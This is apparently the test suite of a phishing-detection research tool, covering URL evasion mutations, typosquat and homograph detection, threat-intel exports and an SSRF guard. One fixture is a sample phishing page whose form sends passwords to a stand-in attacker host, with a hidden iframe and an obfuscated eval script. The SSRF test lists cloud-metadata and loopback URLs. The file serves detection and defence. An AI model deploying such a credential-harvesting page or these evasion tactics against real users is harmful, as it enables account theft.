"""
Comprehensive test suite for PhishGraph Top 10 Advanced Research Features.
Covers:
1. Adversarial attack simulation & robustness engine
2. Brand impersonation & typosquatting radar
3. IDN Homograph & Punycode confusable detector
4. Spectral graph topology & homophily analytics
5. Campaign kit clustering
6. OASIS STIX 2.1 threat intelligence bundle generation
7. OpenIOC XML blocklist generation
8. SOC alert triage & perimeter firewall rule generator
9. Adaptive Sugeno fuzzy rule profile manager
10. Webhook HMAC-SHA256 signature verification & presentation deck route
"""

import json
import tempfile
import unittest
from pathlib import Path
from app import create_app
from phishguard.model import Detector
from phishguard.adversarial import evaluate_adversarial_robustness, mutate_url
from phishguard.brand import analyze_brand_impersonation, jaro_winkler_similarity
from phishguard.homograph import analyze_homograph_spoofing
from phishguard.graph_analytics import compute_spectral_graph_metrics
from phishguard.clustering import cluster_campaign_urls
from phishguard.stix import generate_stix21_bundle, generate_openioc_xml
from phishguard.soc import get_incident_triage_pack, generate_firewall_rules
from phishguard.fuzzy import get_active_profile, set_active_consequents, infer


class AdvancedResearchFeatureTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.root = Path(__file__).resolve().parent.parent
        cls.temp_dir = tempfile.TemporaryDirectory()
        cls.db_path = Path(cls.temp_dir.name) / 'test_adv.sqlite3'
        model_path = cls.root / 'artifacts/detector.joblib'
        cls.detector = Detector.load(model_path) if model_path.exists() else None
        cls.app = create_app(model=cls.detector, database=cls.db_path)
        cls.client = cls.app.test_client()

    @classmethod
    def tearDownClass(cls):
        cls.temp_dir.cleanup()

    # -------------------------------------------------------------
    # 1. ADVERSARIAL EVASION ENGINE
    # -------------------------------------------------------------
    def test_adversarial_mutations_and_robustness(self):
        url = "https://secure-verify.wallet.account.test/login"
        # Test individual mutation tactics
        padded = mutate_url(url, "subdomain_padding")
        self.assertIn("login.secure-auth.cdn", padded)

        hyphenated = mutate_url(url, "hyphen_fragmentation")
        self.assertIn("-", hyphenated)

        homo = mutate_url(url, "homoglyph_typo")
        self.assertTrue(any(c in homo for c in ['0', '1', '3', '4']))

        userinfo = mutate_url(url, "userinfo_spoofing")
        self.assertIn("@", userinfo)

        if self.detector:
            eval_res = evaluate_adversarial_robustness(self.detector, url)
            self.assertEqual(eval_res['original_url'], url)
            self.assertIn('resilience_score', eval_res)
            self.assertIn('simulations', eval_res)
            self.assertEqual(len(eval_res['simulations']), 6)
            self.assertIn(eval_res['defense_rating'], ['High Resilience', 'Moderate Resilience', 'Vulnerable to Evasion'])

    # -------------------------------------------------------------
    # 2. BRAND IMPERSONATION & TYPOSQUATTING RADAR
    # -------------------------------------------------------------
    def test_brand_impersonation_detection(self):
        # High similarity typosquat
        typo_res = analyze_brand_impersonation("https://paypa1-security.verify.test/login")
        self.assertTrue(typo_res['is_impersonating'])
        self.assertEqual(typo_res['top_brand'], "PayPal")
        self.assertGreater(typo_res['impersonation_score'], 80.0)

        # Keyword containment on non-legitimate domain
        msft_res = analyze_brand_impersonation("https://microsoft-account.fakeportal.test/auth")
        self.assertTrue(msft_res['is_impersonating'])
        self.assertEqual(msft_res['top_brand'], "Microsoft")

        # Legitimate domain should not be flagged as impersonating itself
        legit_res = analyze_brand_impersonation("https://www.paypal.com/signin")
        self.assertFalse(legit_res['is_impersonating'])

    # -------------------------------------------------------------
    # 3. IDN HOMOGRAPH & PUNYCODE ANALYZER
    # -------------------------------------------------------------
    def test_homograph_confusable_detection(self):
        # Cyrillic small letter a (U+0430)
        cyrillic_spoof = "https://\u0430pple.com/login"
        res = analyze_homograph_spoofing(cyrillic_spoof)
        self.assertTrue(res['has_homoglyphs'])
        self.assertGreaterEqual(res['homoglyph_count'], 1)
        self.assertEqual(res['canonical_latin_target'], "apple.com")
        self.assertIn("High Threat", res['threat_level'])

        # Pure ASCII clean domain
        clean_res = analyze_homograph_spoofing("https://github.com/google")
        self.assertFalse(clean_res['has_homoglyphs'])
        self.assertEqual(clean_res['threat_level'], "Clean (Pure ASCII / Standard Script)")

    # -------------------------------------------------------------
    # 4. SPECTRAL GRAPH TOPOLOGY & HOMOPHILY
    # -------------------------------------------------------------
    def test_spectral_graph_metrics(self):
        if self.detector:
            spectral = compute_spectral_graph_metrics(self.detector)
            self.assertIn('homophily_index', spectral)
            self.assertGreaterEqual(spectral['homophily_index'], 0.0)
            self.assertLessEqual(spectral['homophily_index'], 100.0)
            self.assertIn('average_clustering_coefficient', spectral)
            self.assertIn('spectral_laplacian_trace', spectral)
            self.assertIn('theoretical_takeaway', spectral)

    # -------------------------------------------------------------
    # 5. CAMPAIGN CLUSTERING
    # -------------------------------------------------------------
    def test_campaign_clustering(self):
        sample_batch = [
            {"host": "secure-1.wallet.test", "risk_score": 85.0, "verdict": "High risk", "features": {"length": 25, "dot_count": 3, "hyphen_count": 1}},
            {"host": "secure-2.wallet.test", "risk_score": 88.0, "verdict": "High risk", "features": {"length": 25, "dot_count": 3, "hyphen_count": 1}},
            {"host": "ordinary-shop.test", "risk_score": 12.0, "verdict": "Low risk", "features": {"length": 18, "dot_count": 1, "hyphen_count": 1}},
        ]
        clust_res = cluster_campaign_urls(sample_batch)
        self.assertIn('clusters', clust_res)
        self.assertGreaterEqual(clust_res['cluster_count'], 1)

    # -------------------------------------------------------------
    # 6 & 7. OASIS STIX 2.1 & OPENIOC XML EXPORTERS
    # -------------------------------------------------------------
    def test_stix_and_openioc_generation(self):
        scans = [
            {"host": "phish-portal.test", "risk_score": 92.5, "verdict": "High risk", "graph_score": 90.0, "lexical_score": 95.0}
        ]
        # STIX 2.1
        stix_bundle = generate_stix21_bundle(scans)
        self.assertEqual(stix_bundle['type'], 'bundle')
        self.assertEqual(stix_bundle['spec_version'], '2.1')
        self.assertTrue(any(o['type'] == 'indicator' for o in stix_bundle['objects']))

        # OpenIOC XML
        ioc_xml = generate_openioc_xml(scans)
        self.assertIn("<ioc", ioc_xml)
        self.assertIn("phish-portal.test", ioc_xml)
        self.assertIn("PhishGraph Phishing Domain IOC Blocklist", ioc_xml)

    # -------------------------------------------------------------
    # 8. SOC TRIAGE & MULTI-VENDOR FIREWALL RULES
    # -------------------------------------------------------------
    def test_soc_incident_pack_and_firewall_rules(self):
        rules = generate_firewall_rules("malicious-threat.test")
        self.assertIn("malicious-threat.test", rules['suricata'])
        self.assertIn("malicious-threat.test", rules['iptables'])
        self.assertIn("malicious-threat.test", rules['cisco'])
        self.assertIn("0.0.0.0 malicious-threat.test", rules['dns_sinkhole'])

        pack = get_incident_triage_pack({
            "host": "malicious-threat.test",
            "verdict": "High risk",
            "risk_score": 95.0
        })
        self.assertIn("P1 - Critical", pack['priority'])
        self.assertTrue(len(pack['mitre_mappings']) >= 2)
        self.assertTrue(len(pack['containment_checklist']) >= 3)

    # -------------------------------------------------------------
    # 9. ADAPTIVE SUGENO RULE PROFILES
    # -------------------------------------------------------------
    def test_sugeno_rule_profile_manager(self):
        initial = get_active_profile()
        self.assertIn("active_profile", initial)

        # Apply aggressive profile
        aggressive_matrix = [[0.10, 0.40, 0.70], [0.45, 0.70, 0.90], [0.80, 0.95, 0.99]]
        set_active_consequents(aggressive_matrix, "aggressive")
        self.assertEqual(get_active_profile()['active_profile'], "aggressive")

        # Test inference uses new matrix
        score_agg, _ = infer(0.5, 0.5)
        
        # Reset to balanced default
        balanced_matrix = [[0.05, 0.25, 0.55], [0.30, 0.50, 0.75], [0.65, 0.85, 0.95]]
        set_active_consequents(balanced_matrix, "balanced")
        score_bal, _ = infer(0.5, 0.5)
        
        # Aggressive score should be higher than balanced
        self.assertGreater(score_agg, score_bal)

    # -------------------------------------------------------------
    # 10. REST API ENDPOINTS & PRESENTATION DECK
    # -------------------------------------------------------------
    def test_new_api_endpoints(self):
        # 1. Presentation Deck
        resp = self.client.get('/presentation')
        self.assertEqual(resp.status_code, 200)
        self.assertIn(b"Academic Project Review", resp.data)

        # 2. Adversarial Simulate Endpoint
        resp = self.client.post('/api/adversarial/simulate', json={"url": "https://cedar12.test/item"})
        self.assertEqual(resp.status_code, 200)
        data = resp.get_json()
        self.assertIn('resilience_score', data)

        # 3. Brand Analyze Endpoint
        resp = self.client.post('/api/brand/analyze', json={"url": "https://paypal-verify.test"})
        self.assertEqual(resp.status_code, 200)
        self.assertTrue(resp.get_json()['is_impersonating'])

        # 4. Homograph Analyze Endpoint
        resp = self.client.post('/api/homograph/analyze', json={"url": "https://example.com"})
        self.assertEqual(resp.status_code, 200)

        # 5. Spectral Graph Endpoint
        resp = self.client.get('/api/graph/spectral')
        self.assertEqual(resp.status_code, 200)

        # 6. Webhook Simulator Endpoint
        resp = self.client.post('/api/api-console/simulate-webhook', json={
            "webhook_url": "https://siem.example.test/alerts"
        })
        self.assertEqual(resp.status_code, 200)
        wh_data = resp.get_json()
        self.assertIn("sha256=", wh_data['hmac_sha256_signature'])

        # 7. STIX 2.1 Export Endpoint
        resp = self.client.post('/api/export/stix', json={"items": [{"host": "threat.test", "risk_score": 90}]})
        self.assertEqual(resp.status_code, 200)
        self.assertIn(b"bundle--", resp.data)

        # 8. OpenIOC Export Endpoint
        resp = self.client.post('/api/export/openioc', json={"items": [{"host": "threat.test", "risk_score": 90}]})
        self.assertEqual(resp.status_code, 200)
        self.assertIn(b"<ioc", resp.data)

    # -------------------------------------------------------------
    # 10. WEBSITE CONTENT ANALYSIS & SSRF GUARD
    # -------------------------------------------------------------
    def test_website_content_analysis_and_ssrf_guard(self):
        phish_html = """
        <html>
          <head><title>PayPal Security Login</title></head>
          <body oncontextmenu="return false">
            <form action="https://evil-collector.xyz/steal" method="post">
              <input type="password" name="pwd" />
            </form>
            <iframe src="https://evil-collector.xyz/frame" style="display:none"></iframe>
            <script>eval(atob("YWxlcnQoMSk="));</script>
          </body>
        </html>
        """
        resp = self.client.post('/api/content/analyze', json={
            "url": "https://login-check.example.com/auth",
            "html": phish_html,
            "fetch_live": False
        })
        self.assertEqual(resp.status_code, 200)
        data = resp.get_json()
        self.assertEqual(data['content_verdict'], 'High risk')
        self.assertGreaterEqual(data['content_risk_score'], 65.0)
        self.assertEqual(data['features']['password_inputs'], 1)
        self.assertEqual(data['features']['external_form_action'], 1)
        self.assertEqual(data['features']['title_brand_mismatch'], 1)

        # SSRF protection must block loopback and private IPs
        for blocked_url in ("http://127.0.0.1:5000/api/health", "http://localhost/admin", "http://169.254.169.254/latest"):
            ssrf_resp = self.client.post('/api/content/analyze', json={
                "url": blocked_url,
                "fetch_live": True
            })
            self.assertEqual(ssrf_resp.status_code, 400)

    # -------------------------------------------------------------
    # 11. SUGENO FUZZY RULE VALIDATION & CONSISTENT LABELS
    # -------------------------------------------------------------
    def test_sugeno_rule_validation_and_consistent_labels(self):
        from phishguard.fuzzy import validate_sugeno_rules, set_active_consequents

        # Valid default rules
        resp = self.client.get('/api/fuzzy/validate')
        self.assertEqual(resp.status_code, 200)
        vdata = resp.get_json()
        self.assertTrue(vdata['valid'])
        self.assertTrue(all(vdata['checks'].values()))

        # Non-monotonic matrix must be rejected
        bad_matrix = [[0.90, 0.50, 0.10], [0.30, 0.50, 0.75], [0.65, 0.85, 0.95]]
        bad_resp = self.client.post('/api/fuzzy/validate', json={"consequents": bad_matrix})
        self.assertEqual(bad_resp.status_code, 400)
        self.assertFalse(bad_resp.get_json()['valid'])
        with self.assertRaises(ValueError):
            set_active_consequents(bad_matrix, "bad")

        # Consistent labels and narrative explanation in /api/predict
        pred = self.client.post('/api/predict', json={"url": "https://instagram.com"})
        self.assertEqual(pred.status_code, 200)
        pdata = pred.get_json()
        self.assertIn(pdata['predicted_class'], ('Benign', 'Phishing'))
        self.assertIn(pdata['verdict'], ('Low risk', 'Review needed', 'High risk'))
        self.assertIn('explanation_summary', pdata)
        self.assertIn('Sugeno inference', pdata['explanation_summary'])


if __name__ == '__main__':
    unittest.main()
